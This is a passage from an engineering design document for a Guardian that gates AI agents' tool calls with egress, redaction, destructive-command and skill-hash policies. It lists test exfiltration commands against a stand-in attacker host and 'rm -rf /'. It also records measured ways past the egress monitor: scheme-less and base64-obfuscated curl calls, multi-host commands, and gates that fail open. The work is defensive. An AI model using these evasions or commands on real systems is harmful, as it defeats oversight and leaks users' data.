    class N2,N11,N21,N23,N24,N26,N30,N31 nonui
    class S1,S2,S7,S8,S10,S17 store
    class N54,N55 new
```

### Demo walkthrough

| Step | Action | Where to look |
|------|--------|---------------|
| **1** | Ask for a fetch of an off-allowlist host | S17 admits `WebFetch` → N2 builds `arguments.url` → N54 answers `url` → N23 writes the leaf |
| **2** | AGT decides on the wire's own field | N30 reads `snapshot.tool_call.args.url`, `egress.rego`'s **first** default path — no annotator involved |
| **3** | Denial lands | N24 → U2, and N26 → U20/U21 |
| **4** | Ask for `curl` of the same host | N2 builds `arguments.command` **and** `raw_command` → N54 answers `command` |
| **5** | The Guardian originates the destination | N30 dispatches N55, which answers `{destination}` → `["annotations", "egress", "destination"]`, the last of `egress.rego`'s five `default_destination_paths` |
| **6** | Same rule, same reason code, different provenance | Identical `egress_destination_not_allowed` at U2. The two routes differ in **provenance**, not in verdict — and not in any coordinate V7's matrix carries; see the amendment under C7.2 |

### ⚠️ V9 widens the request gate's matcher and NOT the result gate's, and that is measured rather than cautious

`claude-code.hookmap.yaml`'s `PostToolUse` entry declares `outputs.from: $.tool_response.stdout` and `outputs.within: $.tool_response`. A `WebFetch` result carries no `stdout`, so `resolvePath` answers `undefined` and `buildPayload` **throws** — *"a result payload carrying no output would ask the far end to govern a step whose output it cannot see"*. That throw is caught by `governStep` at stage `"request"` and answered with the negotiated delivery posture, which under the shipped default (`proceed`) means **the step runs ungoverned with an audit event**.

So widening `PostToolUse` alongside `PreToolUse` would buy a fail-open on every fetch result, in exchange for nothing: no stock gate reads a fetch's output. V9 widens the request gate only, and `.claude/settings.json` keeps `^Bash$` on `PostToolUse`.

**The general form of this is not V9's to close, and is stated so it is not mistaken for solved:** `outputs.from` is a single path per hook, exactly as `policy_target` was a single path per intervention point — the same one-shape-per-gate assumption, one layer out, in the hookmap instead of the manifest. N54 answers it for arguments; nothing answers it for outputs. Whoever governs a second tool shape *at the result gate* needs the `outputs` counterpart of S10's `by_tool` table, and that is a slice with its own measurements.

### What N54 replaces, and why the old check cannot simply be kept

`test/path-dialects.test.ts` derives `mapping.yaml`'s `into_argument` from `policy/manifest.yaml`'s `policy_target` and fails if the two stop describing one leaf. Under V9 the manifest's `policy_target` names the normalised leaf, so that derivation would yield the leaf's own name — which is no host's argument, and would fail against every row of the new table.

The check does not disappear; it splits into the two agreements that are actually load-bearing now:

1. The manifest's `policy_target` names the leaf N23 writes. One derivation, as before.
2. Every argument named in S10's `by_tool` table is one the tool it is keyed by can actually carry — checked against `policy/manifest.yaml`'s `tools:` registry for existence, which is the honest half. ⚠️ *The registry cannot tell whether `WebFetch` takes a `url`, only that `WebFetch` is registered — the same limit §V8 measured for hookmap `tools` entries, and for the same reason: the manifest names more than any one host dispatches.*



### What is config, and what is code

The demo's first half is the strongest form of R2.1 available, and it is worth being precise about why. `egress.rego` declares its own destination paths, and the **first** is `["snapshot", "tool_call", "args", "url"]`. `assemblePreToolCallSnapshot` already unwraps every ACS `arguments.<k>.value` into `tool_call.args.<k>`. So for a tool whose ACS arguments name a `url`, the wire and the gate already agree, and nothing translates between them.

Measured, with one `data.json` key and one manifest `tools:` entry:

| Envelope | Verdict |
|---|---|
| `arguments.url.value = "https://docs.anthropic.com/x"` | `allow`, `result_labels: ["public"]` |
| `arguments.url.value = "https://exfil.attacker.test/steal"` | `deny` `egress_destination_not_allowed` |

Zero code, zero Rego, `verify:pin` untouched. **The code in this slice is not what makes egress work** — it is what makes a *second tool shape* work at all, and what covers the shell case the first half cannot.

⚠️ *Read that split precisely, because "no code" is easy to over-read. **Deciding** about a fetch's destination costs no code. **Getting a fetch call as far as being decided about** is C9's subject, and it is code: measured against a copy of `mapping.yaml` with the two fetch rows deleted, so the tool falls back to `default: command`, the benign fetch above comes back `deny`, reason `evaluation_failed`, with the Guardian's own message: `mapping.yaml reads tool "WebFetch"'s policy target from argument "command", but this call sent no such argument (it sent: url)`. The gate is configuration; the second tool shape is not.*

### C9: why a second tool needs code before it needs policy

AGT's `manifest.schema.json` defines `intervention_point` with `additionalProperties: false` and exactly one `policy_target`. One manifest, one point, one path — no per-tool variation. Before this slice, `policy/manifest.yaml` declared `$.tool_call.args.command`, and AGT resolves that path *before any rule runs*.

Measured: a benign `WebFetch` call under that target was denied with `runtime_error:path_missing`, message *"Request blocked by Agent Control Specification."* Not evaluated and allowed — **denied, on a missing path, with no rule consulted.**

That had never bitten because `.claude/settings.json` and `hosts/claude-code/settings.json` both matched `^Bash$`. The deployment governed exactly one tool, whose argument is named `command`, which is why one literal had been able to stand in for a table. Both files now match `^(Bash|WebFetch)$` at the request gate.

So the normalised leaf: `mapping.yaml` names, per intervention point, which argument each tool's policy target is read from, N23 writes it to one fixed snapshot leaf, and the manifest keeps its single `policy_target` pointed at that leaf. Every gate stays live in one Guardian, which is the property a second manifest per gate would have cost.

**⚠️ The leaf is shared with `patterns` and `redact`, and that had to be measured rather than assumed.** Both fall back to `input.policy_target.value` — `pattern_text()` explicitly, `redact_verdict` directly. A URL landing there is evaluated by rules written for shell commands.

The table below replaces the two partial ones this section carried during planning. It summarises the full measurement, taken against **the manifest and the `policy/lib/data.json` this slice actually ships**, through the shipped assembler and the shipped `createDeploymentBridge`; the column is AGT's own verdict rather than the ACS decision it maps to, and the verbatim captures are in `docs/demos/v9-runbook.md`:

| Tool | Policy target | AGT verdict |
|---|---|---|
| `Bash` | `echo hi` | `allow`, `result_labels: ["public"]` |
| `Bash` | `rm -rf /` | `deny` `destructive_shell_command_blocked` |
| `Bash` | `curl https://exfil.attacker.test/steal` | `deny` `egress_destination_not_allowed` |
| `Bash` | `curl https://docs.anthropic.com/x` | `allow`, `result_labels: ["public"]` |
| `Bash` | `echo ghp_ABCDEF123456` | `transform`, `transform.value` = `echo [REDACTED]` |
| `WebFetch` | `https://docs.anthropic.com/x` | `allow`, `result_labels: ["public"]` |
| `WebFetch` | `https://exfil.attacker.test/steal` | `deny` `egress_destination_not_allowed` |
| `WebFetch` | `https://docs.anthropic.com/?t=ghp_ABCDEF123456` | `transform`, `transform.value` = `https://docs.anthropic.com/?t=[REDACTED]` |

Four gate classes decide these eight rows — `ifc` (the `result_labels`), `patterns`, `redact`, `egress` — and **no gate produced a false positive in either direction across them**: the destructive-shell patterns fired on none of the five rows carrying a URL, and the egress gate fired on none of the three rows carrying no destination. Stated as a measurement rather than as a property: eight rows against one configuration is not a proof, and a ninth input could still find a URL that matches a shell pattern or a command that matches a host glob. **The AGT layer is sound under a shared leaf, as far as these eight rows reach.** The full ACS-level captures are in `docs/demos/v9-runbook.md`.

⚠️ *One dependency inside the table, easy to lose: AGT ranks an egress deny **above** a redact transform, so the two `docs.anthropic.com` transform rows only reach the redact rule because `*.anthropic.com` is in the shipped allowlist. Narrow that entry and those rows become egress denials — correct behaviour, and a confusing failure.*

**⚠️ The ACS layer was not, and this is the defect the slice exists to close.** Before this slice, `mapping.yaml` answered "which argument does an override get written to" with a literal, `into_argument: command`, for every tool. The last row of the table above was re-run through **the pre-slice `mapVerdict` and the pre-slice `mapping.yaml`, both taken verbatim out of `be5ab38`** and handed the real AGT verdict the shipped bundle produces for it:

```
pre-slice mapVerdict + mapping    {"decision":"modify","reasoning":"A secret in this command was replaced before it ran. Policy: redaction_applied, from AGT's stock bundle (agt_stock).","reason_codes":["redaction_applied"],"policy_references":[{"policy_id":"agt_stock","rule_id":"redaction_applied"}],"modifications":{"parameter_overrides":{"command":"https://docs.anthropic.com/?t=[REDACTED]"}}}
the url the tool would still send "https://docs.anthropic.com/?t=ghp_ABCDEF123456"
```

The redaction is emitted against an argument `WebFetch` does not have, and `url` — still carrying the token — is what the tool would go on to send. A modification reported applied while the original ships: the same family as risk rows 15 and 17, reached from a third direction. **N54 is the answer, and its shape is the point**: the argument the target is read *from* and the argument an override is written *to* are one declaration read twice, because two declarations would be two things that can disagree. `test/path-dialects.test.ts` used to derive `into_argument` from the manifest's `policy_target`; under a normalised leaf that derivation yields the leaf's own name, which is no host's argument, so the check changed with it rather than being deleted. The full capture, with the AGT verdict that fed it, is in `docs/demos/v9-runbook.md`.

**One consequence small enough to lose and wrong enough to matter, and it is visible in the capture above:** `mapping.yaml`'s `summaries.redaction_applied.pre_tool_call` read *"A secret in this **command** was replaced before it ran."* Under a shared leaf that sentence is wrong for every non-shell tool, and it is the sentence a model reads. The shipped wording is *"A secret in this step's arguments was replaced before it ran."*

### C7.2: the half that costs a claim

The `url` route covers `WebFetch` and covers nothing else. Exfiltration is `curl https://evil.test/x`, and that destination lives inside `raw_command` — an ACS v0.1.0 field this repository types in `validate-envelope.ts:100`, no hookmap declares, and no assembler forwards. `capability` beside it is the same story at line 98, and its own spec description offers `network.egress` as a worked example.

Forwarding `raw_command` is not enough on its own, and **the mechanism this paragraph originally gave for that was wrong** — it read *"`host_of()` splits on `://` and `/`, so handed `curl https://evil.test/x` it answers `curl https`."* Measured by calling the rule directly through the OPA binary the pinned SDK ships:

```
host_of("echo hi")                             -> "echo hi"
host_of("ls -la /tmp")                         -> "ls -la "
host_of("curl https://evil.test/x")            -> "evil.test"
host_of("curl https://docs.anthropic.com/x")   -> "docs.anthropic.com"
host_of("curl https://docs.anthropic.com; ls") -> "docs.anthropic.com; ls"
```

Against the shipped allowlist, only the fourth of those five is allowed. `split(url, "://")[1]` is everything *after* the scheme, so an embedded, path-bounded URL yields a perfectly good host — that is the case that works, and it is the only one. Two things break the rest. `host_of` has a **second branch** for strings containing no `://` which returns the command's own leading word, so a forwarded command line **always** resolves a destination; no allowlist pattern matches a command line, so every benign shell step would be denied. And where nothing bounds the host on the right, trailing shell text is swallowed into it — the fifth row turns an allowlisted destination into a denial.

So extraction is a real step. It lands in N55 and reaches policy at `input.annotations.egress.destination` — one of the five entries in `egress.rego`'s own `default_destination_paths`, which is to say AGT anticipated exactly this seam and declared the address for it.

Measured, with the dispatcher supplied — three of the eight rows in the table above, with the annotation the gate actually read beside each:

| `raw_command` | `input.annotations` | AGT verdict |
|---|---|---|
| `echo hi` | `{"egress":{}}` | `allow` — no destination found, gate `undefined`, falls through |
| `curl https://exfil.attacker.test/steal` | `{"egress":{"destination":"https://exfil.attacker.test/steal"}}` | `deny` `egress_destination_not_allowed` |
| `curl https://docs.anthropic.com/x` | `{"egress":{"destination":"https://docs.anthropic.com/x"}}` | `allow` |

**⚠️ Amended after measurement: the distinction is real and the matrix cell is not.** This paragraph read *"the destination is Guardian-originated, so the cell is `guardian_only` where C7.1's cell is `expressed` — two colours for one gate"*. Measured against the shipped harness, that is not implementable and would not have meant what it said. V7's matrix is **8 AGT intervention points × 5 AGT verdicts**, and both axes are read off the pinned SDK's own `InterventionPoint` and `Decision` consts (`packages/conformance/src/cells.ts`). There is no coordinate for a gate class and none for a route. `pre_tool_call × deny` already resolves `expressed`, from the patterns gate, via `failure-domains.ts` — so an egress deny at that coordinate adds no cell and changes no status, and a second deny at the same coordinate cannot be given a different colour without widening the axes to carry a third dimension nothing else measures. That is V8's own rule applied again: *"a `SurfaceDiff` is not a cell of V7's 8 × 5"*.

What survives is the claim itself, restated where it is true: **the two routes are two claims, and the difference is provenance.** The `url` route's destination is constructible from the ACS envelope alone; the `raw_command` route's is originated by the Guardian — the status R1.3's `annotations` and R1.4's identity already carry. That is why both halves ship instead of one, and it is stated in `docs/demos/v9-runbook.md` and here, not encoded as a cell.

**What V9 does and does not change in `packages/conformance`.** It adds **no cell** to the coverage matrix and changes **neither of its axes** — that half of the original correction stands. It does not leave the package untouched, and an earlier draft of this paragraph said it did. Declaring an annotator on the shipped manifest meant every construction of a bridge against that manifest had to supply a dispatcher or answer `runtime_error:annotation_failed` on every call, and two of those constructions are production files under `packages/conformance/src/`. All of them — and the Guardian itself — now build their bridge through one `createDeploymentBridge`, published at the declared `guardian/deployment` subpath, so the harness and the deployment provably construct the same bridge rather than the harness measuring a replica of one.

**⚠️ Watch-for: a command the extractor cannot parse is not denied, it is unexamined.** The gate is `undefined` when no destination resolves, so an obfuscated or novel egress form falls through to `allow`. This is the failure direction to state plainly in the runbook, because the demo's shape invites the opposite reading.

**⚠️ Watch-for: an annotator the Guardian dispatches nothing for denies every call.** Measured — one manifest declaring `annotators: egress: {type: classifier}`, evaluated by a bridge built without a dispatcher, answered `deny runtime_error:annotation_failed` (*"egress: missing required field 'url'"*) for `echo hi` as readily as for a `curl`. Not a no-op: a **total deny wearing a runtime-error reason**, which reads like a policy decision. This is why `policy/manifest.drift.yaml` is a sibling file rather than a block in the main manifest, and V9 takes the other road — one manifest, with `startGuardian` supplying the dispatcher unconditionally. The seam already exists (`CreateBridgeOptions.annotator`); what changes is that it stops being optional. A test asserting a benign call is not denied under the shipped manifest is the backstop, and it is the one test in this slice whose absence would be silent.

**⚠️ Watch-for: `egress` must carry an explicit `allowlist`.** With the key absent, `allowlist(rules)` falls back to `input.tool.security_labels` — `["shell"]` on every tool `policy/manifest.yaml` registers — and every destination is denied. `policy/manifest.yaml`'s own `bash` comment anticipated the coupling ("carried only so `bash` behaves like `Bash` the moment `cfg.egress` ever gets configured") but not this direction of it. First recorded in the spike's residual; it becomes V9's the moment V9 sets the key.

### ⚠️ An annotator's `from` is a liveness precondition, not a projection — and this is §A8's family arriving a second time

Planning assumed `annotations.<name>.from` named the value the dispatcher would be handed. Measured against the pinned SDK, all three halves of that are wrong, and each one changes the implementation:

1. **The annotator is never called when `from` does not resolve.** The SDK resolves the path first and fails the whole call closed. A `WebFetch` call under a `from` of `$.tool_call.args.command` came back `deny runtime_error:path_missing` with the dispatcher recording zero calls.
2. **`from` is required.** A manifest declaring `annotations: {egress: {}}` does not parse — *"intervention_points.pre_tool_call.annotations.egress: missing field `from`"* — so "just omit it" is not available.
3. **The resolved value never reaches the dispatcher.** `config` is the annotator's own *declaration* (`{"from":"$.tool_call.raw_command","type":"classifier"}` — the path, not the value), and `preliminary` is AGT's whole preliminary policy input: `{intervention_point, policy_target, snapshot, annotations, tool}`. There is no projection to receive.

**Two consequences, and neither is optional.** N23 must write `raw_command` on **every** request snapshot, as the empty string when the wire carried none — otherwise every call by a tool that sends no command is a total deny wearing a runtime-error reason. And N55 reads the command out of `preliminary.snapshot.tool_call.raw_command` itself, because there is nothing to hand it.

This is §A8's family — in `docs/shaping/spike-unreached-gates.md` — reached from a second direction. §A8 is *a declared annotator with no dispatcher denies everything*; this is *a declared annotator whose `from` cannot resolve denies everything, with the annotator never reached*. Same total deny, same runtime-error reason that reads like a policy decision, different cause — which is why the answer is structural in both cases rather than a matter of getting the manifest right.

### C5: OpenCode's fetch tool, with the evidence for each half named separately

The **name** was measured before this slice: §V5's live run through a Guardian recorded `read / grep / write / edit / webfetch -> deny runtime_error:path_missing`, which is OpenCode reporting its own tool names.

The **argument key** was, during planning, read out of the shipped `opencode` 1.18.18 binary's own tool renderer (`t.input.url`) — evidence about the tool's input shape, and not a live measurement of what lands in the plugin's `args`. It was therefore held as unverified until measured live, and it now has been: a real `opencode run` session with the real plugin loaded, driven by a local stub model emitting a canned `webfetch` call, produced this on the wire —

```json
"payload":{"tool":{"name":"webfetch"},"arguments":{"url":{"value":"https://example.org/"},"format":{"value":"text"}}}
```

— confirmed twice, once under an AGT deny and once under an allow whose path additionally ran the whole chain end to end: `mapping.yaml`'s `by_tool.webfetch: url` row → N54 → N23's leaf copy → AGT's fixed `policy_target` resolving → the real egress rule evaluating → OpenCode's own `webfetch` tool actually running. `mapping.yaml` needed no change. The tool *name* was not re-derived from scratch in that run — it was reused from §V5's measurement to construct the stub's canned call — so this reconfirms the name as a side effect and establishes the argument key as new evidence.

### What V9 does not claim

Widening the matcher governs the tools named in it and no others. Claude Code dispatches many more, and each new one is a `tools:` registration plus a `mapping.yaml` row plus a matcher entry — additive, but not automatic, and not something this slice's demo should be read as having done. The `runtime_error:tool_unknown` wall that made `Bash` and `bash` both necessary is unchanged and is what fails an unregistered tool closed.

Three things this slice leaves open, stated here rather than left to the risk table alone:

1. **The extractor's miss direction is this slice's, and it is a miss rather than a block** (risk row 22). `egress.rego`'s gate is `undefined` when no destination resolves, so an obfuscated or novel egress form falls through to `allow` — measured, and captured in the runbook rather than asserted: `curl exfil.attacker.test/steal` (no scheme) and `curl $(echo <base64 of the same URL> | base64 -d)` are both allowed against the same allowlist that denies the plain form. A command reaching two hosts has its first examined and the rest unexamined, for the same structural reason: the gate takes one destination. The annotator's own doc comment says so at the point of the code, and so does §5 of the runbook.

2. **The result gate's one-shape assumption is *not* this slice's and stays unassigned** (risk row 24). A hookmap declares `outputs.from` once per hook exactly as the manifest declared `policy_target` once per intervention point. V9 bounds the exposure by widening the request gate's matcher only, and no more. The general close is the `outputs` counterpart of S10's `by_tool` table; it needs its own measurements per host, and the two shipped hookmaps' `outputs` blocks already differ — `mirrors` on one, a real `exit_status` path on the other. Nothing here answers it, and nothing here should be read as having narrowed it.

3. **The registry check on the `by_tool` table is existence-only.** `test/path-dialects.test.ts` checks that every key in `policy_target_argument.by_tool` is a tool `policy/manifest.yaml`'s own `tools:` registry knows. It can say `WebFetch` is registered; it can never say `WebFetch` takes a `url`. That is the same limit §V8 measured for hookmap `tools` entries and it has the same cause: one manifest serves both hosts, so the registry deliberately names more tools than either host dispatches, and nothing in this repository carries a tool's argument shape. The `by_tool` values are held honest by live measurement per tool — §V5's for `bash`, C5's above for `webfetch` — never by a check.

---

## V10: A hook AGT has no host for

**Demo:** Load a skill whose bytes changed since it was approved. AGT's stock `content_hash` gate denies it, driven by `steps/skillLoad` — an ACS hook no AGT host package implements, deciding through AGT's own unforked bundle.

This is R8.3 answered by building it, and R8.4's whole subject. It is also the first slice where the headroom argument is *run* rather than shown, which is the sequencing the frame asks for: completeness first, headroom at the end.

| # | Place | Component | Affordance | Control | Wires Out | Returns To |
|---|-------|-----------|------------|---------|-----------|------------|
| N56 | P3 | guardian | `assembleSkillLoadSnapshot()` — a third sibling beside V1's and V4's: `tool_call.name` ← `skill_id`, `tool_call.content_hash` ← `digest.value` | call | → N30 | — |
| N21 | P3 | guardian | `validateEnvelope()` — gains `hooks/skill-load.json` | call | → N22, → N27 | — |
| N28 | P3 | guardian | `buildServerHello()` — `methods_evaluated` gains `steps/skillLoad` | call | → N26 | → N5, → N14 |
| S10 | shared | store | `mapping.yaml` — a row binding `steps/skillLoad` to an AGT intervention point | — | — | → N23, → N24 |
| S8 | P3.1 | store | `data.agt.defaults.config` — gains `content_hash.enforce` | — | — | → N30 |
| S7 | P3.1 | store | `policy/manifest.yaml` — the approved digest, on the skill's own `tools:` entry | — | — | → N31 |

**This slice's affordances are N56, N21, N28, S10, S8, S7.**

### Why this gate is reachable at all

Two facts, both measured, neither obvious from reading AGT.

**AGT's `$defs/tool` is `additionalProperties: true`,** so a manifest tool entry may declare a `content_hash` — legal rather than merely tolerated. And the SDK carries it through: reading AGT's own `policyInput` back out of the bridge's evidence path, `input.tool` came back as `{"content_hash":"sha-256:APPROVED","id":"code-reviewer","type":"Tool","name":"code-reviewer"}`.

With `config.content_hash.enforce: true` and the observed hash placed at `snapshot.tool_call.content_hash`, all three stock behaviours fire:

| Observed | Verdict |
|---|---|
| matches the declared | `allow` |
| differs | `deny` `tool_content_hash_mismatch` — *"declared sha-256:APPROVED but observed sha-256:POISONED"* |
| absent | `deny` `tool_content_hash_mismatch` — *"manifest declared tool.content_hash but snapshot.tool_call.content_hash was missing"* |

The gate needs exactly one thing from this side: a `snapshot.tool_call.content_hash`. ACS supplies it.

### The two documents were written independently about the same threat

`hooks/skill-load.json` requires `digest {algorithm, value}` and says what a Guardian is to do with it:

> The Guardian compares it against the digest it approved at `steps/skillRegister`; a mismatch means the artifact changed between registration and load (tamper or swap).
>
> A load the Guardian cannot tie to an approved registration, or whose digest differs from the approved one, is unverifiable and SHOULD be denied.

That is, clause for clause, what `content_hash.rego` decides — mismatch denies, and declared-but-unobserved denies. Neither document cites the other.

**⚠️ The subject differs, and the slice must say so rather than let the demo imply otherwise.** AGT's gate is about a **tool**; ACS v0.1.0 puts the integrity digest on a **skill**. The AgBOM makes the split explicit rather than incidental: `skill_fields.definition` is required to carry `{ref, digest}` and is described as *"the surface attackers poison"*, while `tool_fields` requires only `capability`. So this is not one field living at a different address — it is the same control applied to a different component class, and the published claim is "AGT's rule decides an ACS-native subject", never "ACS carries AGT's tool hash".

### The limit, stated in the slice rather than discovered in the demo

**⚠️ The approved digest is manifest-static, and it cannot be otherwise from this side.** `content_hash.rego` reads the declared hash from `input.tool.content_hash` and nowhere else. `input.tool` is resolved by the SDK from the manifest's `tools:` catalog, keyed by `tool_call.name`. There is no config hook — no `declared_paths` counterpart to `egress`'s `destination_paths` — and annotations are not consulted.

So a digest a Guardian approved at `steps/skillRegister` **cannot reach this gate through session state.** V10 declares the approved digest in the manifest and says so plainly. The register→load binding ACS actually specifies — persist `(skill_id, digest)` at registration, check the pair at load — is a Guardian-side control that AGT has no part in, and V10 does not build it. Closing the gap the other way would mean AGT accepting a declared hash from the snapshot, which weakens AGT's own trust model; that is an upstream conversation, not a slice.

**⚠️ V10 depends on V9 and cannot be reordered.** A skill-load snapshot has no `command` argument, so under the pre-V9 manifest it hits `runtime_error:path_missing` before `content_hash` is consulted — the identical wall V9 measured for `WebFetch`. The normalised policy-target leaf is the dependency, not the egress gate.

### Which hooks this implementation instruments, and which it does not

D3 is closed by this slice, so the number belongs here — and the denominator has to be stated with it, because two correct counts are in circulation. `hooks/` holds 29 files: seven are `.acs-provenance` profile variants of a sibling, leaving **22 hook payload schemas**, of which **19 are `steps/*`** and three are not (`agbom/snapshot`, `agbom/changed`, `system/ping`). R5.4 asks which `steps/*` hooks are instrumented, so **19 is this row's denominator**, and it is the figure V1 planning established by counting the schemas on disk against `specification.md` §5's stale table of 16.

This implementation instruments **three of the nineteen**: `steps/toolCallRequest`, `steps/toolCallResult`, `steps/skillLoad`. The other sixteen are not implemented, and most are not named in `mapping.yaml` either — that table declares AGT's eight intervention points against the ACS methods they map to, which is six `steps/*` methods and two nulls, so it was never a coverage statement about ACS's surface. What speaks to a conformant client is `buildServerHello`'s `methods_evaluated`: a method omitted there tells the client, in `handshake.json`'s own words, to treat that gate as ALLOW-by-default.

Three of nineteen is the honest figure, and it is the frame this slice's headroom claim has to sit inside: the argument is not that ACS's surface is covered, it is that one of its uncovered hooks already drives an unforked AGT rule.

---

**⚠️ Found by V5, pre-existing, and NOT V5's to repair — six hookmap faults that are decidable without a payload are answered by the delivery posture, so under `proceed` the step runs ungoverned.** V5 put three static checks on the wrong seam in three consecutive review rounds — `mirrors`, then the `exit_status` both-forms refusal, then the request gate's scopability — and each time the symptom was identical: `buildEnvelope` throws, `govern-step` catches it at stage `"request"`, `applyFailurePosture` answers, and under `proceed` (the spec default, and what this deployment ships) the tool call proceeds with an audited fail-open. Fixing V5's three exposed that the seam already carries six more, every one of them a property of the hookmap alone:

| Fault, decidable from the hookmap with no payload | Where it throws today | Measured under the default posture |
|---|---|---|
| `outputs` declared with no `exit_status.literal` or `.from` | `exitStatusOf` | exit 0, `proceeded` |
| `outputs.from` empty or missing | `buildPayload` | exit 0, `proceeded` |
| `outputs.within` empty or missing | `buildPayload` | exit 0, `proceeded` |
| `outputs.from` not inside `outputs.within` | `buildPayload` | exit 0, `proceeded` |
| `arguments` declared as a non-string | `buildPayload` | exit 0, `proceeded` |
| an entry declaring **neither** `arguments` nor `outputs` | `buildPayload` | exit 0, `proceeded` |

The rule these keep violating is one sentence: **a fault decidable from the hookmap alone belongs at `loadHookmap`, where it exits 2; only a fault that needs the invocation's payload belongs where the posture can answer it.** The two live in adjacent code, which is why they keep being confused. `govern-step.ts` already draws exactly this line for a different pair and explains it at length — what is missing is that `buildPayload`'s own checks were never held to it.

Not repaired in V5 because every one predates this slice, none is reachable through either shipped hookmap (both are pinned by tests that load them), and the repair is a single sweep of one module rather than six edits — the same argument §V4 made for parking its landing check rather than doing it twice by gate. Recorded here, with a destination, rather than left in a review transcript.

**⚠️ V8 planning ruled: these six are NOT V8's, and they remain unassigned.** They sit in this section because it is the end of the document, not because the upstream watch is their home — V8's subject is a contract moving *upstream*, and every one of these is a property of a hookmap this repository ships. The rule that governs them is unchanged and is one sentence: *a fault decidable from the hookmap alone belongs at `loadHookmap`, where it exits 2; only a fault that needs the invocation's payload belongs where the posture can answer it.* Whoever takes them takes all six in one sweep of `buildPayload`/`exitStatusOf`. Stated as an explicit non-assignment rather than left to be inherited by whichever slice is planned next.

**⚠️ Found by V5's whole-branch review, pre-existing, and NOT this branch's to repair — a gate's `tools` list is never checked against the vocabulary its own host dispatches.** `governStep` scopes on the tool its caller tells it (`GovernStepInput.scopedTool`, review round 4), and `governsTool` compares that string to the entry's `tools` list case-sensitively. Nothing anywhere checks that the list names strings the host actually sends. **Measured:** the shipped `opencode.hookmap.yaml` with its request gate's `tools: [bash]` recased to `[Bash]` — one token — loads clean through `loadHookmap` **and** `assertHostAcceptsEveryDecision`, `AcsPlugin` registers both hooks, and a real `bash` call carrying `rm -rf /` is then skipped with **no throw, arguments untouched, and 0 audit entries**. The gate silently governs nothing. **Pre-existing and unchanged by round 4:** the outcome is byte-for-byte identical before and after, because host #2's shim already skipped on the same mismatch at its own early `governsTool` call — what round 4 briefly added was a *claim* that `assertEntryMatchesGate` closed it, which was false: that gate pins `tool_name`, `outputs.from`, `outputs.within` and each gate's payload shape, and `tools` is precisely what its `fixedPaths` does not pin (`acs-plugin.ts`'s own `GateEntryShape` comment says so). Neither shipped hookmap reaches it, since both are pinned by tests that load them and both use their host's real casing — `bash` for OpenCode, and host #1 declares no `tools` at all. **The candidate close — cross-check each `tools` entry against `policy/manifest.yaml`'s tool registry at load — is deliberately not a drive-by**, and this is the part to weigh before taking it: on host #2 an over-refusal at load means OpenCode logs `failed to load plugin` and runs the **entire session with no plugin registered**, completely ungoverned (measured elsewhere in this section). A registry check that is wrong in the refusing direction therefore trades a silently-skipped gate for a silently-ungoverned session, which is strictly worse. **Destination: V8** — it still needs its own measurements and a decision about what a hookmap may legitimately name that a manifest does not (MCP-qualified tool names being the obvious case), but V8 is the slice whose *mechanism* already fits: a scheduled harness that diffs two declared surfaces and names the field that moved (`N46 diffSurfaces()` → `N53 renderUpstreamDiff()` → `U31`), reporting rather than refusing. Reporting is the direction this residual's own measurement argues for, since the refusing form is what trades the skipped gate for the ungoverned session. Stated as a placement decision rather than a pre-existing fit: V8 today watches *upstream* AGT surfaces, and this widens its subject to a deployment-side pair — a hookmap's `tools` against `policy/manifest.yaml`'s registry. Recorded with a destination rather than left in a review transcript, on the same precedent as the six posture-seam faults above.

**⚠️ V8 planning measured the candidate close, and it does not close this.** The proposal above is to cross-check each `tools` entry against `policy/manifest.yaml`'s registry. Measured, the registry is `["run_shell", "Bash", "bash"]` — all three, deliberately, because each is a different host's real spelling and the file's own comments say so (`Bash` is Claude Code's, `bash` is OpenCode's, `run_shell` is AGT's stock example). So the exact failure this residual was filed for — OpenCode's `tools: [bash]` recased to `[Bash]` — **passes** a registry cross-check, because `Bash` is registered. The open question was recorded as "what a hookmap may legitimately name that a manifest does not"; the measurement inverts it. The manifest names *more* than any one host dispatches, and it must, because one manifest serves both hosts. **What V8 builds is therefore narrower than this row proposed and is honest about it**: it reports a `tools` entry the registry knows nothing about, which catches the typo class, and it does not claim to catch a gate recased to the other host's registered name. Closing that needs a per-host declaration of the names that host actually dispatches — a document this repository does not have, and writing one is its own decision rather than a drive-by inside a watch.

**⚠️ Found by V5, pre-existing, and NOT V5's to repair — the Inspector's tail tests gate on wall-clock sleeps.** One transient suite failure was observed during V5 (once in four runs, not captured before it self-resolved; sixteen consecutive clean runs afterwards, so it is rare rather than imagined). Nothing in the slice's own diff can cause intermittency, and the likeliest source is structural: `packages/inspector/test/tail-audit-log.test.ts` and `tail-envelope-log.test.ts` set `POLL_MS = 10` and gate **58 assertions on 22 bare `await Bun.sleep(…)` waits of 30–80 ms** (`POLL_MS * 3` through `* 8`, seven of them at the 30 ms floor) for "the poller has certainly emitted", in a suite that concurrently spawns real subprocesses and port-0 Guardians. A twenty-third call site races a `* 20` (200 ms) timeout inside a `Promise.race`, which is a bound rather than a wait and is not one of the 22. ⚠️ *Third statement of this paragraph's numbers, and the first that survives checking. It first said "roughly twenty-five assertions on a 30 ms budget" — one file's assertion total attached to a budget governing two of its waits — and then gave the range as 30–200 ms by borrowing the outlier's magnitude while correctly excluding the outlier from the count. Left visible rather than tidied away, because a filing whose whole subject is an unmeasured timing assumption is the last place a number should go unmeasured, and it took two corrections to notice.* Secondary suspects are those subprocess suites themselves. The repair is to make the tail tests **event-driven** — await the next emission rather than a duration — which is a change to V2's rail rather than to anything V5 built. Recorded with a destination rather than left in a review transcript, on the same precedent as the six posture-seam faults above.

**⚠️ V8 planning ruled: this is NOT V8's either.** The subject is the Inspector's own test rail, and nothing about it moves when AGT does. It belongs to whoever next opens `packages/inspector/test/`; it sits in this section for the same reason the six faults above do — this is the end of the document, not the upstream watch's scope.

## Risks and dependencies

| # | Risk | Slice | Handling |
|---|------|-------|----------|
| 1 | ~~`updatedToolOutput` does not behave as documented~~ | ~~V4~~ | ✅ **Retired.** F1 resolved by hand against Claude Code 2.1.227 during V4 planning: it exists and rewrites tool results, so V4 does not drop. Replaced by rows 15 and 16, which are the conditions the original row did not anticipate |
